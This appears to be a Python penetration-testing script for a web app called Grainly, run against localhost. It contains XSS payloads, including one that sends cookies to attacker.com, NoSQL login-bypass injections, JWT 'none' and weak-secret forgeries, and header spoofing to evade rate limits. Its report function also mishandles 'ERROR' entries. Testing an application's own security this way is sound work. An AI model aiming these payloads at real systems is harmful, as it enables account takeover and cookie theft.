#!/usr/bin/env python3
"""
Burp Suite Testing Script for Grainly Project
Automated vulnerability testing scenarios
"""

import requests
import json
import time
import jwt
import base64
from urllib.parse import urljoin

class GrainlyPenTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        
    def log(self, severity, message, payload=None):
        """Log test results"""
        result = {
            "severity": severity,
            "message": message,
            "payload": payload,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.results.append(result)
        print(f"[{severity}] {message}")
        if payload:
            print(f"Payload: {payload}")
        print("-" * 50)
    
    def test_csrf_vulnerability(self):
        """Test CSRF protection on state-changing endpoints"""
        print("\n🔍 Testing CSRF Protection...")
        
        csrf_endpoints = [
            "/api/auth/register",
            "/api/users/profile", 
            "/api/bookings",
            "/api/contact",
            "/api/auth/forgot-password"
        ]
        
        for endpoint in csrf_endpoints:
            try:
                # Test without CSRF token
                response = self.session.post(
                    urljoin(self.base_url, endpoint),
                    json={"test": "csrf_test"},
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    self.log("HIGH", f"CSRF vulnerability found on {endpoint}", 
                            f"POST {endpoint}")
                else:
                    self.log("INFO", f"CSRF protection working on {endpoint}")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing {endpoint}: {str(e)}")
    
    def test_xss_vulnerability(self):
        """Test XSS vulnerabilities"""
        print("\n🔍 Testing XSS Protection...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
        ]
        
        # Test contact form
        for payload in xss_payloads:
            try:
                data = {
                    "name": payload,
                    "email": "xss@test.com",
                    "message": payload
                }
                
                response = self.session.post(
                    urljoin(self.base_url, "/api/contact"),
                    json=data
                )
                
                if response.status_code == 200:
                    self.log("MEDIUM", f"XSS payload accepted: {payload[:50]}...")
                else:
                    self.log("INFO", f"XSS protection working for payload")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing XSS: {str(e)}")
    
    def test_nosql_injection(self):
        """Test NoSQL injection vulnerabilities"""
        print("\n🔍 Testing NoSQL Injection...")
        
        injection_payloads = [
            {"email": {"$ne": None}, "password": "anything"},
            {"email": {"$regex": ".*"}, "password": "anything"},
            {"email": "admin@test.com", "password": {"$gt": ""}},
            {"email": "test' || '1'=='1", "password": "anything"}
        ]
        
        for payload in injection_payloads:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/api/auth/login"),
                    json=payload
                )
                
                if response.status_code == 200 and "token" in response.text:
                    self.log("CRITICAL", "NoSQL injection successful!", payload)
                else:
                    self.log("INFO", "NoSQL injection protection working")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing NoSQL injection: {str(e)}")
    
    def test_jwt_manipulation(self):
        """Test JWT token manipulation"""
        print("\n🔍 Testing JWT Token Security...")
        
        # First, get a valid token
        try:
            login_data = {
                "email": "test@test.com",
                "password": "Test1234!"
            }
            
            response = self.session.post(
                urljoin(self.base_url, "/api/auth/login"),
                json=login_data
            )
            
            if response.status_code == 200:
                token = response.json().get("token")
                if token:
                    self.test_jwt_attacks(token)
                else:
                    self.log("INFO", "No token received, skipping JWT tests")
            else:
                self.log("INFO", "Login failed, skipping JWT tests")
                
        except Exception as e:
            self.log("ERROR", f"Error in JWT testing: {str(e)}")
    
    def test_jwt_attacks(self, token):
        """Test various JWT attacks"""
        
        # 1. Test algorithm confusion
        try:
            parts = token.split('.')
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())
            
            # Change algorithm to none
            header['alg'] = 'none'
            new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            fake_token = f"{new_header}.{new_payload}."
            
            response = self.session.get(
                urljoin(self.base_url, "/api/users/profile"),
                headers={"Authorization": f"Bearer {fake_token}"}
            )
            
            if response.status_code == 200:
                self.log("HIGH", "JWT algorithm confusion successful!", fake_token)
            else:
                self.log("INFO", "JWT algorithm confusion protection working")
                
        except Exception as e:
            self.log("ERROR", f"Error testing JWT algorithm confusion: {str(e)}")
        
        # 2. Test weak secrets
        weak_secrets = ["secret", "admin", "password", "123456", "grainly"]
        
        for secret in weak_secrets:
            try:
                # Try to sign with weak secret
                fake_payload = {"id": "507f1f77bcf86cd799439011", "iat": int(time.time())}
                fake_token = jwt.encode(fake_payload, secret, algorithm='HS256')
                
                response = self.session.get(
                    urljoin(self.base_url, "/api/users/profile"),
                    headers={"Authorization": f"Bearer {fake_token}"}
                )
                
                if response.status_code == 200:
                    self.log("CRITICAL", f"JWT weak secret found: {secret}", fake_token)
                    break
                    
            except Exception as e:
                continue
    
    def test_rate_limiting_bypass(self):
        """Test rate limiting bypass techniques"""
        print("\n🔍 Testing Rate Limiting Bypass...")
        
        bypass_headers = [
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "192.168.1.1"},
            {"X-Forwarded-For": "192.168.1.1, 192.168.1.2, 192.168.1.3"}
        ]
        
        login_data = {"email": "test@test.com", "password": "WrongPass123!"}
        
        for headers in bypass_headers:
            try:
                # Try multiple requests with different IP headers
                for i in range(10):
                    response = self.session.post(
                        urljoin(self.base_url, "/api/auth/login"),
                        json=login_data,
                        headers=headers
                    )
                    
                    if "too many" not in response.text.lower():
                        self.log("MEDIUM", f"Rate limiting bypass possible with headers: {headers}")
                        break
                else:
                    self.log("INFO", f"Rate limiting working with headers: {headers}")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing rate limiting bypass: {str(e)}")
    
    def test_authorization_bypass(self):
        """Test authorization bypass attempts"""
        print("\n🔍 Testing Authorization Bypass...")
        
        protected_endpoints = [
            "/api/users",
            "/api/bookings/admin",
            "/api/users/activity-logs"
        ]
        
        for endpoint in protected_endpoints:
            try:
                # Test without authentication
                response = self.session.get(urljoin(self.base_url, endpoint))
                
                if response.status_code == 200:
                    self.log("HIGH", f"Authorization bypass successful on {endpoint}")
                elif response.status_code == 401:
                    self.log("INFO", f"Authorization working on {endpoint}")
                else:
                    self.log("MEDIUM", f"Unexpected status {response.status_code} on {endpoint}")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing {endpoint}: {str(e)}")
    
    def test_information_disclosure(self):
        """Test for information disclosure"""
        print("\n🔍 Testing Information Disclosure...")
        
        sensitive_endpoints = [
            "/.env",
            "/config",
            "/package.json",
            "/api/users",
            "/api/users/profile"
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                
                if response.status_code == 200:
                    content = response.text.lower()
                    sensitive_keywords = ["jwt", "mongo", "secret", "password", "key"]
                    
                    for keyword in sensitive_keywords:
                        if keyword in content:
                            self.log("CRITICAL", f"Sensitive information disclosed in {endpoint}: {keyword}")
                            break
                    else:
                        self.log("INFO", f"Endpoint {endpoint} accessible but no sensitive info")
                else:
                    self.log("INFO", f"Endpoint {endpoint} properly protected")
                    
            except Exception as e:
                self.log("ERROR", f"Error testing {endpoint}: {str(e)}")
    
    def run_all_tests(self):
        """Run all penetration tests"""
        print("🚀 Starting Grainly Penetration Testing...")
        print("=" * 60)
        
        self.test_csrf_vulnerability()
        self.test_xss_vulnerability()
        self.test_nosql_injection()
        self.test_jwt_manipulation()
        self.test_rate_limiting_bypass()
        self.test_authorization_bypass()
        self.test_information_disclosure()
        
        self.generate_report()
    
    def generate_report(self):
        """Generate test report"""
        print("\n" + "=" * 60)
        print("📊 PENETRATION TESTING REPORT")
        print("=" * 60)
        
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        
        for result in self.results:
            severity_counts[result["severity"]] += 1
        
        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = severity_counts[severity]
            if count > 0:
                print(f"{severity}: {count} findings")
        
        print(f"\nTotal Findings: {len(self.results)}")
        
        # Show critical and high findings
        print("\n🚨 CRITICAL & HIGH FINDINGS:")
        for result in self.results:
            if result["severity"] in ["CRITICAL", "HIGH"]:
                print(f"- {result['message']}")
                if result["payload"]:
                    print(f"  Payload: {result['payload']}")

if __name__ == "__main__":
    tester = GrainlyPenTester()
    tester.run_all_tests() 